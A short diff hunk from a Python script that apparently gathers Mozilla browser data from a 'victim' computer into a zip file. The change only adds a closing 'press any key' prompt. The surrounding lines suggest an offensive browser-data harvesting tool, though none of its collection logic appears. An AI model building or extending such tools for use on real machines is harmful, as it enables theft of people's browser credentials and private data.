@@ -66,6 +66,7 @@ def main():
     shutil.move('{}_MOZDATA.zip'.format(VICTIMCOMPUTER),dest)
 
     print('[+] Done! Look for file at {}\{}_MOZDATA.zip'.format(TEMPDIR,VICTIMCOMPUTER))
-    
+    input('[+] Press any key to close...')
+
 if __name__ == '__main__':
     main()
